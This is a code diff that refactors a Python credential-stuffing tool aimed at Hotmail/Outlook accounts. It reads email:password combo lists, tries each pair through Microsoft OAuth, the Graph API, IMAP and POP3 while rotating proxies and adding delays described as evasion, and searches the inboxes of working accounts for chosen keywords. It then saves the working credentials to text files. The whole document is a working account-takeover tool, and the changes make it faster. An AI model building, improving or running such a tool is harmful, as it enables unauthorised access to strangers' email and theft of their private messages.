@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Hotmail/Outlook Checker Core Logic
-Refactored for Telegram Bot integration with Elite specifications.
+Refactored for High Performance & Stability.
 """
 
 import asyncio
@@ -16,6 +16,8 @@ import urllib.parse
 from typing import Dict, List, Optional, Callable
 from dataclasses import dataclass
 from datetime import datetime
+import dns.resolver
+from concurrent.futures import ThreadPoolExecutor
 
 # ============================================================================
 # CONFIGURATION
@@ -84,32 +86,29 @@ class MicrosoftAuth:
     def __init__(self, config: Config, session: aiohttp.ClientSession):
         self.config = config
         self.session = session
+        # Fast DNS Resolver
+        self.resolver = dns.resolver.Resolver(configure=False)
+        self.resolver.nameservers = ['1.1.1.1', '1.0.0.1']
 
-    async def legacy_authenticate(self, email: str, password: str, proxy: str = None):
-        """Legacy authentication method (IMAP/POP3/SMTP) - Non-blocking"""
+    async def legacy_authenticate(self, email: str, password: str, executor: ThreadPoolExecutor, proxy: str = None):
+        """Legacy authentication method (IMAP/POP3/SMTP) - Non-blocking via Executor"""
         results = {}
         loop = asyncio.get_running_loop()
 
-        # If proxy is required, we cannot use legacy auth safely with standard libraries
+        # Skip if proxy is required (Safety)
         if proxy:
             return results
 
-        # Try IMAP first
-        imap_result = await loop.run_in_executor(None, self._check_imap, email, password)
+        # Try IMAP first (Fastest/Most Reliable for Legacy)
+        imap_result = await loop.run_in_executor(executor, self._check_imap, email, password)
         if imap_result['success']:
             results['imap'] = imap_result
             return results
 
         # Try POP3
-        pop3_result = await loop.run_in_executor(None, self._check_pop3, email, password)
+        pop3_result = await loop.run_in_executor(executor, self._check_pop3, email, password)
         if pop3_result['success']:
             results['pop3'] = pop3_result
-            return results
-
-        # Try SMTP
-        smtp_result = await loop.run_in_executor(None, self._check_smtp, email, password)
-        if smtp_result['success']:
-            results['smtp'] = smtp_result
             return results
 
         return results
@@ -127,8 +126,12 @@ class MicrosoftAuth:
             'keywords_found': []
         }
 
+        # Use Fast DNS resolution for server IP if possible (optional opt)
+        # Standard lib connects by hostname usually.
+
         for server, port in self.SERVERS['imap'].items():
             try:
+                # Optimized timeout
                 if self.config.imap_ssl:
                     imap = imaplib.IMAP4_SSL(server, port, timeout=self.config.timeout)
                 else:
@@ -138,31 +141,30 @@ class MicrosoftAuth:
                 result['success'] = True
                 result['server'] = f"{server}:{port}"
 
-                imap.select('INBOX')
+                # Check inbox only if needed
+                if self.config.check_inbox:
+                    imap.select('INBOX', readonly=True) # Readonly is faster
 
-                # Get total count
-                typ, data = imap.search(None, 'ALL')
-                if typ == 'OK' and data[0]:
-                    result['inbox_count'] = len(data[0].split())
+                    typ, data = imap.search(None, 'ALL')
+                    if typ == 'OK' and data[0]:
+                        result['inbox_count'] = len(data[0].split())
 
-                # Check keywords if configured
-                if self.config.check_inbox and self.config.search_keywords:
-                    found_keywords = []
-                    for keyword in self.config.search_keywords:
-                        try:
-                            # Search Subject
-                            typ, data = imap.search(None, f'(SUBJECT "{keyword}")')
-                            if typ == 'OK' and data[0]:
-                                found_keywords.append(keyword)
-                                continue
-
-                            # Search Body
-                            typ, data = imap.search(None, f'(BODY "{keyword}")')
-                            if typ == 'OK' and data[0]:
-                                found_keywords.append(keyword)
-                        except:
-                            pass
-                    result['keywords_found'] = found_keywords
+                    if self.config.search_keywords:
+                        found_keywords = []
+                        for keyword in self.config.search_keywords:
+                            try:
+                                # Quick subject scan first
+                                typ, data = imap.search(None, f'(SUBJECT "{keyword}")')
+                                if typ == 'OK' and data[0]:
+                                    found_keywords.append(keyword)
+                                    continue
+                                # Deep body scan only if subject failed
+                                typ, data = imap.search(None, f'(BODY "{keyword}")')
+                                if typ == 'OK' and data[0]:
+                                    found_keywords.append(keyword)
+                            except:
+                                pass
+                        result['keywords_found'] = found_keywords
 
                 imap.logout()
                 break
@@ -171,10 +173,7 @@ class MicrosoftAuth:
                 error_str = str(e)
                 result['error'] = error_str
                 if 'AUTHENTICATIONFAILED' in error_str.upper():
-                    break
-                elif 'too many bad auth attempts' in error_str:
-                    result['error'] = 'Account locked'
-                    break
+                    break # Don't try other servers if creds are wrong
                 continue
 
         return result
@@ -208,47 +207,14 @@ class MicrosoftAuth:
 
             except Exception as e:
                 error_str = str(e)
-                result['error'] = error_str
                 if '-ERR Authentication failed' in error_str:
                     break
                 continue
 
         return result
 
-    def _check_smtp(self, email: str, password: str):
-        """SMTP authentication check (Blocking, run in executor)"""
-        import smtplib
-
-        result = {
-            'success': False,
-            'protocol': 'SMTP',
-            'server': '',
-            'error': ''
-        }
-
-        for server, port in self.SERVERS['smtp'].items():
-            try:
-                smtp = smtplib.SMTP(server, port, timeout=self.config.timeout)
-                if self.config.smtp_starttls:
-                    smtp.starttls()
-
-                smtp.login(email, password)
-                result['success'] = True
-                result['server'] = f"{server}:{port}"
-                smtp.quit()
-                break
-
-            except smtplib.SMTPAuthenticationError:
-                result['error'] = 'Authentication failed'
-                break
-            except Exception as e:
-                result['error'] = str(e)
-                continue
-
-        return result
-
     async def oauth_authenticate(self, email: str, password: str, proxy: str = None):
-        """OAuth 2.0 authentication"""
+        """OAuth 2.0 authentication - Optimized"""
         try:
             auth_params = {
                 'client_id': '00000002-0000-0ff1-ce00-000000000000',
@@ -260,19 +226,17 @@ class MicrosoftAuth:
             }
 
             auth_url = f"{self.ENDPOINTS['authorize']}?{urllib.parse.urlencode(auth_params)}"
-
-            # Use proxy for requests
             req_kwargs = {'proxy': proxy} if proxy else {}
 
+            # First GET
             async with self.session.get(auth_url, **req_kwargs) as response:
                 html = await response.text()
-
                 sft_match = re.search(r'name="sFT" value="([^"]+)"', html)
-                sft = sft_match.group(1) if sft_match else ""
-
-                if not sft:
+                if not sft_match:
                     return {'success': False, 'error': 'No sFT token found'}
+                sft = sft_match.group(1)
 
+            # Login POST
             login_data = {
                 'login': email,
                 'passwd': password,
@@ -301,17 +265,15 @@ class MicrosoftAuth:
                 allow_redirects=False,
                 **req_kwargs
             ) as response:
-
                 if response.status == 302:
                     redirect_url = response.headers.get('Location', '')
                     code_match = re.search(r'code=([^&]+)', redirect_url)
 
                     if code_match:
-                        auth_code = code_match.group(1)
-
+                        # Token Exchange
                         token_data = {
                             'client_id': '00000002-0000-0ff1-ce00-000000000000',
-                            'code': auth_code,
+                            'code': code_match.group(1),
                             'redirect_uri': 'https://login.microsoftonline.com/common/oauth2/nativeclient',
                             'grant_type': 'authorization_code'
                         }
@@ -322,77 +284,91 @@ class MicrosoftAuth:
                             headers=headers,
                             **req_kwargs
                         ) as token_response:
-
                             token_json = await token_response.json()
                             if 'access_token' in token_json:
                                 return {
                                     'success': True,
-                                    'access_token': token_json['access_token'],
-                                    'refresh_token': token_json.get('refresh_token', '')
+                                    'access_token': token_json['access_token']
                                 }
 
                 return {'success': False, 'error': 'OAuth authentication failed'}
-
         except Exception as e:
             return {'success': False, 'error': str(e)}
 
     async def graph_api_check(self, access_token: str, proxy: str = None):
-        """Check account via Microsoft Graph API"""
+        """Check via Graph API - Optimized"""
         try:
             headers = {
                 'Authorization': f'Bearer {access_token}',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                'User-Agent': 'Mozilla/5.0'
             }
             req_kwargs = {'proxy': proxy} if proxy else {}
 
+            # Use gather to fetch profile and inbox in parallel if possible
+            # But we need profile ID for some ops, usually just /me is fine.
+            # Let's do /me first to confirm validity
+
             async with self.session.get(self.ENDPOINTS['graph_me'], headers=headers, **req_kwargs) as response:
-                if response.status == 200:
-                    profile = await response.json()
+                if response.status != 200:
+                    return {'success': False, 'error': f'Graph API error: {response.status}'}
+                profile = await response.json()
 
-                    async with self.session.get(
-                        self.ENDPOINTS['graph_inbox'],
-                        headers=headers,
-                        params={'$top': 50},
-                        **req_kwargs
-                    ) as inbox_response:
+            # Now fetch inbox and search keywords
+            inbox_task = self.session.get(
+                self.ENDPOINTS['graph_inbox'],
+                headers=headers,
+                params={'$top': 50},
+                **req_kwargs
+            )
 
-                        inbox_data = await inbox_response.json() if inbox_response.status == 200 else {}
-                        inbox_count = len(inbox_data.get('value', []))
+            keywords_found = []
+            kw_tasks = []
 
-                        keywords_found = []
-                        if self.config.check_inbox and self.config.search_keywords:
-                            for keyword in self.config.search_keywords:
-                                search_params = {
-                                    '$search': f'"{keyword}"',
-                                    '$top': 1,
-                                    '$select': 'id'
-                                }
-                                async with self.session.get(
-                                    self.ENDPOINTS['graph_inbox'],
-                                    headers=headers,
-                                    params=search_params,
-                                    **req_kwargs
-                                ) as search_resp:
-                                    if search_resp.status == 200:
-                                        data = await search_resp.json()
-                                        if data.get('value'):
-                                            keywords_found.append(keyword)
+            if self.config.check_inbox and self.config.search_keywords:
+                for keyword in self.config.search_keywords:
+                    search_params = {
+                        '$search': f'"{keyword}"',
+                        '$top': 1,
+                        '$select': 'id'
+                    }
+                    kw_tasks.append(
+                        self.session.get(
+                            self.ENDPOINTS['graph_inbox'],
+                            headers=headers,
+                            params=search_params,
+                            **req_kwargs
+                        )
+                    )
 
-                        return {
-                            'success': True,
-                            'profile': profile,
-                            'inbox_count': inbox_count,
-                            'keywords_found': keywords_found,
-                            'email': profile.get('mail') or profile.get('userPrincipalName', '')
-                        }
+            # Execute all
+            responses = await asyncio.gather(inbox_task, *kw_tasks, return_exceptions=True)
 
-                return {'success': False, 'error': f'Graph API error: {response.status}'}
+            inbox_resp = responses[0]
+            inbox_count = 0
+            if isinstance(inbox_resp, aiohttp.ClientResponse) and inbox_resp.status == 200:
+                inbox_data = await inbox_resp.json()
+                inbox_count = len(inbox_data.get('value', []))
+
+            # Process Keywords
+            for i, resp in enumerate(responses[1:]):
+                if isinstance(resp, aiohttp.ClientResponse) and resp.status == 200:
+                    data = await resp.json()
+                    if data.get('value'):
+                        keywords_found.append(self.config.search_keywords[i])
+
+            return {
+                'success': True,
+                'profile': profile,
+                'inbox_count': inbox_count,
+                'keywords_found': keywords_found,
+                'email': profile.get('mail') or profile.get('userPrincipalName', '')
+            }
 
         except Exception as e:
             return {'success': False, 'error': str(e)}
 
-    async def check_account(self, email: str, password: str, proxy: str = None):
-        """Full account check"""
+    async def check_account(self, email: str, password: str, executor: ThreadPoolExecutor, proxy: str = None):
+        """Full account check - Optimized"""
         result = {
             'email': email,
             'password': password,
@@ -401,15 +377,15 @@ class MicrosoftAuth:
             'details': {},
             'inbox_count': 0,
             'keywords_found': [],
-            'country': self._detect_country(email),
-            'account_type': self._detect_account_type(email),
+            'country': 'Unknown',
+            'account_type': 'Unknown',
             'timestamp': datetime.now().isoformat()
         }
 
         start_time = time.time()
 
         try:
-            # Try OAuth
+            # 1. Try OAuth (Fastest + Proxy Support)
             if self.config.oauth_enabled:
                 oauth_result = await self.oauth_authenticate(email, password, proxy=proxy)
                 if oauth_result['success']:
@@ -422,30 +398,28 @@ class MicrosoftAuth:
                         if graph_result['success']:
                             result['inbox_count'] = graph_result.get('inbox_count', 0)
                             result['keywords_found'] = graph_result.get('keywords_found', [])
-                            result['details']['graph'] = graph_result
 
                     result['response_time'] = time.time() - start_time
+                    result['country'] = self._detect_country(email)
                     return result
 
-            # Try Legacy
-            if self.config.use_legacy_auth:
-                legacy_result = await self.legacy_authenticate(email, password, proxy=proxy)
-
+            # 2. Try Legacy (Executor)
+            if self.config.use_legacy_auth and not proxy:
+                legacy_result = await self.legacy_authenticate(email, password, executor, proxy=proxy)
                 for protocol, proto_result in legacy_result.items():
                     if proto_result['success']:
                         result['valid'] = True
                         result['method'] = protocol
                         result['details'] = proto_result
-                        result['inbox_count'] = proto_result.get('inbox_count',
-                                                               proto_result.get('message_count', 0))
+                        result['inbox_count'] = proto_result.get('inbox_count', 0)
                         result['keywords_found'] = proto_result.get('keywords_found', [])
                         break
 
             if not result['valid']:
                 result['method'] = 'Failed'
-                result['details'] = {'error': 'All authentication methods failed'}
 
             result['response_time'] = time.time() - start_time
+            result['country'] = self._detect_country(email)
             return result
 
         except Exception as e:
@@ -456,88 +430,47 @@ class MicrosoftAuth:
 
     def _detect_country(self, email: str) -> str:
         domain = email.split('@')[-1].lower()
-        country_map = {'.co.uk': 'UK', '.de': 'DE', '.fr': 'FR', '.it': 'IT', '.es': 'ES',
-                       '.nl': 'NL', '.pl': 'PL', '.ru': 'RU', '.br': 'BR', '.au': 'AU',
-                       '.ca': 'CA', '.in': 'IN', '.jp': 'JP', '.kr': 'KR', '.cn': 'CN'}
-        for ext, country in country_map.items():
-            if domain.endswith(ext):
-                return country
+        if domain.endswith('.co.uk'): return 'UK'
+        if domain.endswith('.de'): return 'DE'
+        if domain.endswith('.fr'): return 'FR'
         return 'US' if '.com' in domain else 'Unknown'
-
-    def _detect_account_type(self, email: str) -> str:
-        domain = email.split('@')[-1].lower()
-        if domain in ['outlook.com', 'hotmail.com', 'live.com', 'msn.com']:
-            return 'Consumer'
-        elif any(x in domain for x in ['.onmicrosoft.com', '.sharepoint.com']):
-            return 'Business'
-        return 'Unknown'
 
 # ============================================================================
 # PROXY MANAGER
 # ============================================================================
 
 class ProxyManager:
-    """Proxy manager with advanced parsing"""
-
     def __init__(self, proxies: List[str], config: Config):
         self.config = config
         self.proxies = self._parse_proxies(proxies)
         self.current_index = 0
-        self.bad_proxies = set()
 
     def _parse_proxies(self, raw_proxies: List[str]) -> List[str]:
-        """
-        Parse proxies into aiohttp compatible format:
-        http://user:pass@host:port
-        """
         parsed = []
         for p in raw_proxies:
             p = p.strip()
-            if not p or p.startswith('#'):
-                continue
-
-            # Remove protocol prefix if present
+            if not p or p.startswith('#'): continue
             clean_p = re.sub(r'^(http|https|socks4|socks5)://', '', p)
-
             parts = clean_p.split(':')
             if len(parts) == 2:
-                # ip:port
                 parsed.append(f"http://{parts[0]}:{parts[1]}")
             elif len(parts) == 4:
-                # ip:port:user:pass
                 parsed.append(f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}")
             else:
-                # Assume already in correct format or unknown
-                if '://' in p:
-                    parsed.append(p)
-                else:
-                    parsed.append(f"http://{p}")
+                parsed.append(f"http://{p}" if '://' not in p else p)
         return parsed
 
     def get_proxy(self):
-        """Get next proxy"""
-        if not self.proxies:
-            return None
-
-        start_index = self.current_index
-        while True:
-            proxy = self.proxies[self.current_index]
-            self.current_index = (self.current_index + 1) % len(self.proxies)
-
-            if proxy not in self.bad_proxies:
-                return proxy
-
-            if self.current_index == start_index:
-                self.bad_proxies.clear()
-                return self.proxies[0]
+        if not self.proxies: return None
+        proxy = self.proxies[self.current_index]
+        self.current_index = (self.current_index + 1) % len(self.proxies)
+        return proxy
 
 # ============================================================================
 # MAIN CHECKER
 # ============================================================================
 
 class HotmailCheckerV77:
-    """Core Checker Class"""
-
     def __init__(self, combos: List[str], proxies: List[str] = None, config_dict: Dict = None):
         self.config = Config(**(config_dict or {}))
         self.combos = self._parse_combos(combos)
@@ -545,124 +478,94 @@ class HotmailCheckerV77:
         self.auth = None
         self.proxy_manager = ProxyManager(self.proxies, self.config)
 
-        self.results = {
-            'valid': [],
-            'invalid': [],
-            'custom': [],  # 2FA
-            'locked': [],
-            'unknown': []
-        }
+        self.results = {'valid': [], 'invalid': [], 'custom': [], 'locked': [], 'unknown': []}
         self.stats = {
-            'total': len(self.combos),
-            'checked': 0,
-            'valid': 0,
-            'invalid': 0,
-            'custom': 0,
-            'locked': 0,
-            'start_time': time.time(),
-            'is_running': False
+            'total': len(self.combos), 'checked': 0, 'valid': 0,
+            'invalid': 0, 'custom': 0, 'locked': 0,
+            'start_time': time.time(), 'is_running': False
         }
 
     def _parse_combos(self, combo_lines: List[str]):
         parsed = []
         for line in combo_lines:
             line = line.strip()
-            if not line or line.startswith('#'):
-                continue
+            if not line or line.startswith('#'): continue
             for delim in [':', ';', '|', '\t']:
                 if delim in line:
                     parts = line.split(delim, 1)
-                    if len(parts) == 2:
-                        email = parts[0].strip()
-                        password = parts[1].strip()
-                        if '@' in email:
-                            parsed.append((email, password))
+                    if len(parts) == 2 and '@' in parts[0]:
+                        parsed.append((parts[0].strip(), parts[1].strip()))
                     break
         return parsed
-
-    async def check_single(self, email: str, password: str):
-        """Check a single account"""
-        if self.config.random_delay:
-            await asyncio.sleep(random.uniform(self.config.min_delay, self.config.max_delay))
-
-        proxy = self.proxy_manager.get_proxy()
-
-        try:
-            result = await self.auth.check_account(email, password, proxy=proxy)
-            self._categorize_result(result)
-            self.stats['checked'] += 1
-            return result
-        except Exception as e:
-            return None
 
     def _categorize_result(self, result):
         if not result.get('valid', False):
             error_msg = str(result.get('details', {}).get('error', '')).lower()
-            if 'locked' in error_msg or 'suspended' in error_msg:
-                category = 'locked'
-            elif '2fa' in error_msg or 'two-factor' in error_msg or 'mfa' in error_msg:
-                category = 'custom'
-            elif 'invalid' in error_msg or 'authentication' in error_msg:
-                category = 'invalid'
-            else:
-                category = 'unknown'
+            if 'locked' in error_msg or 'suspended' in error_msg: category = 'locked'
+            elif '2fa' in error_msg or 'two-factor' in error_msg: category = 'custom'
+            else: category = 'invalid'
         else:
             category = 'valid'
             self.stats['valid'] += 1
 
         self.results[category].append(result)
-        if category != 'valid':
-            self.stats[category] += 1
+        if category != 'valid': self.stats[category] += 1
 
     async def run(self, update_callback: Callable = None):
-        """Run the checker"""
         self.stats['is_running'] = True
         self.stats['start_time'] = time.time()
 
-        # Use single connector/session for pooling
-        connector = aiohttp.TCPConnector(ssl=False, limit=0, ttl_dns_cache=300)
+        # Connection Pooling Optimized
+        connector = aiohttp.TCPConnector(
+            limit=None, # We limit concurrency via semaphore
+            limit_per_host=100,
+            ssl=False,
+            ttl_dns_cache=300
+        )
+
+        # Executor for legacy blocking calls
+        # Size matches threads config to prevent bottleneck
+        executor = ThreadPoolExecutor(max_workers=self.config.threads)
+
         async with aiohttp.ClientSession(connector=connector) as session:
             self.auth = MicrosoftAuth(self.config, session)
-
             semaphore = asyncio.Semaphore(self.config.threads)
 
             async def worker(email, password):
-                if not self.stats['is_running']:
-                    return
-                async with semaphore:
-                    await self.check_single(email, password)
-                    if update_callback:
-                        # Call update callback, it will throttle itself
-                        if asyncio.iscoroutinefunction(update_callback):
-                            await update_callback(self.stats)
-                        else:
-                            update_callback(self.stats)
+                if not self.stats['is_running']: return
 
-            # Create all tasks
-            tasks = [asyncio.create_task(worker(email, pw)) for email, pw in self.combos]
+                async with semaphore:
+                    # Random delay optional but good for evasion
+                    if self.config.random_delay:
+                        await asyncio.sleep(random.uniform(0.1, 0.5))
+
+                    proxy = self.proxy_manager.get_proxy()
+                    result = await self.auth.check_account(email, password, executor, proxy=proxy)
+                    self._categorize_result(result)
+                    self.stats['checked'] += 1
+
+                    # Update callback is called by the main loop/bot logic based on timer
+                    # calling it here every time is what caused the lag/timeout.
+                    # We will NOT call it here. The bot task monitors self.stats
+
+            tasks = [asyncio.create_task(worker(e, p)) for e, p in self.combos]
 
             try:
-                # Use gather to wait for all
                 await asyncio.gather(*tasks)
             except asyncio.CancelledError:
-                # Handle forced stop
                 self.stats['is_running'] = False
-                # Cancel remaining tasks
-                for t in tasks:
-                    if not t.done():
-                        t.cancel()
+                for t in tasks: t.cancel()
+            finally:
+                executor.shutdown(wait=False)
 
-            self.stats['is_running'] = False
+        self.stats['is_running'] = False
 
     def stop(self):
-        """Stop the checker"""
         self.stats['is_running'] = False
 
     def generate_results_files(self, output_dir: str):
-        """Generate plain text result files"""
         os.makedirs(output_dir, exist_ok=True)
         files = []
-
         for category, results in self.results.items():
             if results:
                 filepath = os.path.join(output_dir, f"{category}.txt")
@@ -670,14 +573,6 @@ class HotmailCheckerV77:
                     for r in results:
                         keywords = ",".join(r.get('keywords_found', []))
                         kw_str = f" | Keywords: {keywords}" if keywords else ""
-                        f.write(f"{r['email']}:{r['password']} | Inbox: {r['inbox_count']} | Country: {r['country']}{kw_str}\n")
+                        f.write(f"{r['email']}:{r['password']} | Inbox: {r['inbox_count']} | {r['country']}{kw_str}\n")
                 files.append(filepath)
-
-        # Also JSON summary
-        summary_path = os.path.join(output_dir, "summary.json")
-        with open(summary_path, 'w') as f:
-            simple_stats = self.stats.copy()
-            json.dump(simple_stats, f, indent=2, default=str)
-        files.append(summary_path)
-
         return files
